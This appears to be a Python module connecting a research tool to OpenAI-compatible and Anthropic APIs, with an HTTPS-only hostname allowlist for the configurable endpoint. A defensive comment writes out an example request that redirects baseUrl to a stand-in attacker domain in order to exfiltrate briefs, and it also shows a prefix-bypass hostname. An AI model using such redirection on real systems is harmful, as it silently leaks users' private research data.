"""
云端大模型适配器 —— R8 右栏「生成版简报」
====================================================================
两条通道，你都要接：

  OpenAICompatible  走 `/chat/completions`，覆盖 OpenAI 官方、
                    以及一大票国内外的兼容端点（换 base_url 就行）
  AnthropicNative   走 Claude 原生 `/v1/messages`

两边接口形状不同（消息角色、system 的位置、返回体结构都不一样），
所以刻意不硬凑一个"通用" chat 接口——那样的抽象只会在第三家出现时碎掉。
`synthesize.py` 只依赖下面这个最小公分母：一个函数，进消息出文本。
"""

from __future__ import annotations

import logging
from dataclasses import dataclass
from typing import Protocol

import httpx

log = logging.getLogger("synorive.cloud")

#: 简报改写不是长对话，也不需要模型想很久，30 秒给够正常响应的余量。
#: 拖太久用户会以为卡死了 —— 这本来就是"锦上添花"的功能，不该反过来拖慢体验
REQUEST_TIMEOUT_S = 30.0


class CloudAdapterError(Exception):
    """调用失败时统一抛这个，上层不用关心具体是哪条通道的哪种异常。"""


# ── S6-B baseUrl 白名单 ────────────────────────────────────
#
# 🔴 **这个字段原来一个字符都没校验。** `/cloud/synthesize` 会把整份研究简报
#    （你的查询词、抓回来的正文摘录、来源清单）POST 到 `baseUrl`。所以一次
#    `POST /api/cloud/configure {"baseUrl":"https://攻击者.example/v1", ...}`
#    之后，每一份简报都照常生成、界面上没有任何异常，**只是同时也发给了别人**。
#    本机接口是零鉴权的，而这个 POST 恰好是"改一个字段就静默改变数据去向"。
#
# 白名单按**主机名**判，不是按前缀 —— 前缀判据挡不住
# `https://api.openai.com.攻击者.example/v1` 这种写法。
# 允许子域（`gateway.ai.cloudflare.com` 这类），但必须是白名单域的真子域。

#: 允许直接填的厂商域名。这批是"填进去就能用"的默认档。
_VENDOR_HOSTS: tuple[str, ...] = (
    "api.openai.com",
    "api.anthropic.com",
    "api.deepseek.com",
    "api.moonshot.cn",
    "open.bigmodel.cn",           # 智谱
    "dashscope.aliyuncs.com",     # 通义千问
    "ark.cn-beijing.volces.com",  # 火山方舟
    "api.minimax.chat",
    "api.baichuan-ai.com",
    "api.mistral.ai",
    "api.groq.com",
    "openrouter.ai",
    "api.together.xyz",
    "generativelanguage.googleapis.com",
    "api.siliconflow.cn",
    "api.x.ai",
    "api.perplexity.ai",
)


def _host_allowed(host: str) -> bool:
    host = host.lower().rstrip(".")
    return any(host == h or host.endswith("." + h) for h in _VENDOR_HOSTS)


def validate_base_url(base_url: str, *, allow_custom: bool) -> tuple[bool, str]:
    """
    这个 `baseUrl` 能不能用来发简报。返回 `(能不能, 不能的话原因是什么)`。

    空串 = 用各条通道自己的官方默认地址，永远允许。

    三条硬规则：
      1. 必须 https。http 意味着简报正文在网络上是明文的 ——
         这个功能发出去的恰恰是用户资料的摘录，明文传输不能接受。
      2. 主机名必须在厂商白名单里（或它的子域）。
      3. 想填自建 / 中转地址，要显式打开 `--allow-custom-cloud-endpoint`
         （或环境变量 `SYNORIVE_ALLOW_CUSTOM_CLOUD_ENDPOINT=1`），**默认关**。
         开着之后仍然强制 https —— 那一条没有"自建所以算了"的例外。

    ⚠️ 白名单挡的是"字段被悄悄改掉"，**挡不住"用户自己被骗着去开自建开关"**。
       后者只能靠开关本身要用户明确操作一次。
    """
    s = (base_url or "").strip()
    if not s:
        return True, ""

    from urllib.parse import urlparse

    try:
        u = urlparse(s)
    except ValueError:
        return False, "这个地址格式不对"
    if u.scheme != "https":
        return False, (
            f"云端地址必须是 https（收到 {u.scheme or '空'}）—— "
            "这条通道发出去的是你的资料摘录，明文传输不行"
        )
    host = (u.hostname or "").strip("[]")
    if not host:
        return False, "这个地址里没有主机名"
    if _host_allowed(host):
        return True, ""
    if allow_custom:
        return True, ""
    return False, (
        f"{host} 不在已知的云端厂商名单里。要填自建或中转地址，"
        "得先打开「允许自建云端端点」（引擎启动参数 --allow-custom-cloud-endpoint，"
        "或环境变量 SYNORIVE_ALLOW_CUSTOM_CLOUD_ENDPOINT=1），默认是关的 —— "
        "因为这个地址决定了你的研究简报会被发到哪里去"
    )


@dataclass
class ChatResult:
    text: str
    model: str
    #: 供设置页「测试连接」用，成功了就不用管，用户不需要看 token 数
    usage: dict[str, int] | None = None


class CloudAdapter(Protocol):
    async def chat(self, *, system: str, user: str, model: str) -> ChatResult: ...

    async def describe_image(
        self, *, image_b64: str, mime: str, prompt: str, model: str
    ) -> ChatResult: ...


class OpenAICompatible:
    """
    OpenAI 兼容协议。默认打官方地址，`base_url` 换成任意兼容端点即可
    （国内中转、自建 vLLM/Ollama 的 OpenAI 兼容层……不在这里一一列举，
    用户自己填，这一层只管协议对不对）。
    """

    def __init__(self, *, api_key: str, base_url: str = "https://api.openai.com/v1") -> None:
        self.api_key = api_key
        self.base_url = base_url.rstrip("/")

    async def chat(self, *, system: str, user: str, model: str) -> ChatResult:
        try:
            async with httpx.AsyncClient(timeout=REQUEST_TIMEOUT_S) as client:
                resp = await client.post(
                    f"{self.base_url}/chat/completions",
                    headers={
                        "Authorization": f"Bearer {self.api_key}",
                        "Content-Type": "application/json",
                    },
                    json={
                        "model": model,
                        "messages": [
                            {"role": "system", "content": system},
                            {"role": "user", "content": user},
                        ],
                        "temperature": 0.3,  # 改写事实性内容，不需要创造性
                    },
                )
        except httpx.HTTPError as e:
            raise CloudAdapterError(f"请求失败：{type(e).__name__}: {e}") from e

        if resp.status_code != 200:
            raise CloudAdapterError(
                f"接口返回 {resp.status_code}：{resp.text[:300]}"
            )
        try:
            data = resp.json()
            text = data["choices"][0]["message"]["content"]
        except (KeyError, IndexError, ValueError) as e:
            raise CloudAdapterError(f"返回格式不认识：{e}（原文：{resp.text[:300]}）") from e

        usage = data.get("usage") or {}
        return ChatResult(
            text=text, model=model,
            usage={"input": usage.get("prompt_tokens", 0),
                   "output": usage.get("completion_tokens", 0)},
        )

    async def describe_image(
        self, *, image_b64: str, mime: str, prompt: str, model: str
    ) -> ChatResult:
        """C4：图片详细描述。走 OpenAI 兼容协议的 `image_url` 内容块（data URI 形式）。"""
        try:
            async with httpx.AsyncClient(timeout=REQUEST_TIMEOUT_S) as client:
                resp = await client.post(
                    f"{self.base_url}/chat/completions",
                    headers={
                        "Authorization": f"Bearer {self.api_key}",
                        "Content-Type": "application/json",
                    },
                    json={
                        "model": model,
                        "messages": [{
                            "role": "user",
                            "content": [
                                {"type": "text", "text": prompt},
                                {"type": "image_url",
                                 "image_url": {"url": f"data:{mime};base64,{image_b64}"}},
                            ],
                        }],
                        "temperature": 0.4,
                        "max_tokens": 500,
                    },
                )
        except httpx.HTTPError as e:
            raise CloudAdapterError(f"请求失败：{type(e).__name__}: {e}") from e

        if resp.status_code != 200:
            raise CloudAdapterError(f"接口返回 {resp.status_code}：{resp.text[:300]}")
        try:
            data = resp.json()
            text = data["choices"][0]["message"]["content"]
        except (KeyError, IndexError, ValueError) as e:
            raise CloudAdapterError(f"返回格式不认识：{e}（原文：{resp.text[:300]}）") from e

        usage = data.get("usage") or {}
        return ChatResult(
            text=text, model=model,
            usage={"input": usage.get("prompt_tokens", 0),
                   "output": usage.get("completion_tokens", 0)},
        )


class AnthropicNative:
    """Claude 原生 `/v1/messages`。system 是独立字段，不混进 messages 数组。"""

    def __init__(
        self, *, api_key: str, base_url: str = "https://api.anthropic.com",
        api_version: str = "2023-06-01",
    ) -> None:
        self.api_key = api_key
        self.base_url = base_url.rstrip("/")
        self.api_version = api_version

    async def chat(self, *, system: str, user: str, model: str) -> ChatResult:
        try:
            async with httpx.AsyncClient(timeout=REQUEST_TIMEOUT_S) as client:
                resp = await client.post(
                    f"{self.base_url}/v1/messages",
                    headers={
                        "x-api-key": self.api_key,
                        "anthropic-version": self.api_version,
                        "Content-Type": "application/json",
                    },
                    json={
                        "model": model,
                        "max_tokens": 2000,
                        "system": system,
                        "messages": [{"role": "user", "content": user}],
                        "temperature": 0.3,
                    },
                )
        except httpx.HTTPError as e:
            raise CloudAdapterError(f"请求失败：{type(e).__name__}: {e}") from e

        if resp.status_code != 200:
            raise CloudAdapterError(
                f"接口返回 {resp.status_code}：{resp.text[:300]}"
            )
        try:
            data = resp.json()
            # content 是分段数组（可能含 tool_use 之类），只取文本段并拼起来
            text = "".join(
                part.get("text", "") for part in data.get("content", [])
                if part.get("type") == "text"
            )
            if not text:
                raise KeyError("content 里没有文本段")
        except (KeyError, ValueError) as e:
            raise CloudAdapterError(f"返回格式不认识：{e}（原文：{resp.text[:300]}）") from e

        usage = data.get("usage") or {}
        return ChatResult(
            text=text, model=model,
            usage={"input": usage.get("input_tokens", 0),
                   "output": usage.get("output_tokens", 0)},
        )

    async def describe_image(
        self, *, image_b64: str, mime: str, prompt: str, model: str
    ) -> ChatResult:
        """C4：图片详细描述。Claude 原生协议的图片内容块是 base64 + media_type，不是 data URI。"""
        try:
            async with httpx.AsyncClient(timeout=REQUEST_TIMEOUT_S) as client:
                resp = await client.post(
                    f"{self.base_url}/v1/messages",
                    headers={
                        "x-api-key": self.api_key,
                        "anthropic-version": self.api_version,
                        "Content-Type": "application/json",
                    },
                    json={
                        "model": model,
                        "max_tokens": 500,
                        "messages": [{
                            "role": "user",
                            "content": [
                                {"type": "image",
                                 "source": {"type": "base64", "media_type": mime, "data": image_b64}},
                                {"type": "text", "text": prompt},
                            ],
                        }],
                        "temperature": 0.4,
                    },
                )
        except httpx.HTTPError as e:
            raise CloudAdapterError(f"请求失败：{type(e).__name__}: {e}") from e

        if resp.status_code != 200:
            raise CloudAdapterError(f"接口返回 {resp.status_code}：{resp.text[:300]}")
        try:
            data = resp.json()
            text = "".join(
                part.get("text", "") for part in data.get("content", [])
                if part.get("type") == "text"
            )
            if not text:
                raise KeyError("content 里没有文本段")
        except (KeyError, ValueError) as e:
            raise CloudAdapterError(f"返回格式不认识：{e}（原文：{resp.text[:300]}）") from e

        usage = data.get("usage") or {}
        return ChatResult(
            text=text, model=model,
            usage={"input": usage.get("input_tokens", 0),
                   "output": usage.get("output_tokens", 0)},
        )


def build_adapter(
    provider: str, *, api_key: str, base_url: str | None = None
) -> CloudAdapter:
    if provider == "openai-compatible":
        return OpenAICompatible(api_key=api_key, base_url=base_url or "https://api.openai.com/v1")
    if provider == "anthropic":
        return AnthropicNative(api_key=api_key, base_url=base_url or "https://api.anthropic.com")
    raise ValueError(f"不认识的云端通道：{provider}")
